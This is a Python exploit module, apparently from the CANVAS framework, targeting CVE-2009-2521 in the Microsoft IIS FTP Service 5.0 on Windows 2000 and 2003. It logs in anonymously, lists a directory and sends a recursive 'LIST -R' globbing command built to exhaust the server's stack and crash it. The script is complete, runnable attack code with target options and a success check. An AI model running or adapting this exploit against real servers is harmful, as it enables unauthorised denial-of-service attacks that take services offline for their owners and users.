#! /usr/bin/env python


# CANVAS Microsoft FTP Service 5.0 DoS
#

import sys
if "." not in sys.path: sys.path.append(".")

import time
import re

# CANVAS modules
from exploitutils import *
from tcpexploit import *
from libs.wuftplib import FTP

from encoder import *

# GUI info
NAME="IISFTP_GLOBBING"
DESCRIPTION="IIS FTP GLOBBING Stack Exhaustion"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Microsoft"
DOCUMENTATION["Date public"] = "09/04/09"
DOCUMENTATION["References"] = "http://lists.grok.org.uk/pipermail/full-disclosure/2009-September/070518.html"
DOCUMENTATION["CVE Name"] = "CVE-2009-2521"
DOCUMENTATION["CVE Url"] = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-2521"
DOCUMENTATION['CVSS'] = 4.0

VERSION="1.0"

PROPERTY = {}
PROPERTY['TYPE'] = "DoS"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "2000", "2003" ]
PROPERTY['AUTOHACK_EXCLUDE'] = True

NOTES="""
 """
CHANGELOG="""
"""

targets = {
    0 : ["Autodetect (N/A)"],
    1 : ["Windows 2000/2003"]
          }

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)
        self.port = 21
        self.user = "anonymous"
        self.password = "anonymous"
        return
    
    def ftp_connect(self, host, port):
        s = self.gettcpsock()
        s.connect((host, port))
        return s
    
    def ftp_login(self, s, host, user, password):
        s.set_timeout(1.0)

        try:
            ftp = FTP(host, s)
            ftp.login(user, password)
        except:
            s.close()
            return None

        return ftp

    def ftp_setup(self):
        s = self.ftp_connect(self.host, self.port)
        ftp = self.ftp_login(s, self.host, self.user, self.password)
        if ftp == None:
            s.close()
            raise Exception, 'Could not FTP login .. fail'

        return ftp

    def run(self):
        if "user" in self.argsDict:
            self.user = self.argsDict["user"]
        if "password" in self.argsDict:
            self.password = self.argsDict["password"]

        self.host = self.target.interface
        if "port" in self.argsDict:
            self.port = int(self.argsDict["port"])

        self.setInfo("%s attacking %s:%d (in progress)"% (NAME, self.host, self.port))

        if self.version == 0:
            self.log("Auto versioning not available")
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))
            return 0

        ftp = self.ftp_setup()

        sport = ftp.makeport()

        list = "LIST"
        res = ftp.sendcmd(list)

        conn, sockaddr = sport.accept()
        data = conn.recv(1000)
        conn.close()

        match = re.search(r'<DIR> *([^\ \t]).*\r\n', data)
        if match:
            c = match.group(1)

            print "c: %s" % c
            sport = ftp.makeport()
            list = "LIST -R %s*/../" % c
            res = ftp.sendcmd(list)
            conn, sockaddr = sport.accept()
            data = conn.recv(1000)

        time.sleep(10)

        if self.ISucceeded():
            self.setInfo("%s attacking %s:%d - done (succeeded!)"% (NAME, self.host, self.port))
            return 1
        else:
            self.setInfo("%s attacking %s:%d - done (failed!)"% (NAME, self.host, self.port))            

        ftp.close()
        self.log("Exploit finished.")
        self.setState("done")
        return 0

    def usage(self):
        print "Usage: "+sys.argv[0]+" -v version -t target [ -p port ]"
        print "Login: -O user:username -O password:password"
        i = 0
        for line in targets.values():
            print "\t%d : %s"%(i, line[0])
            i += 1
   
if __name__== '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
        
                
                  


    
        
    
    
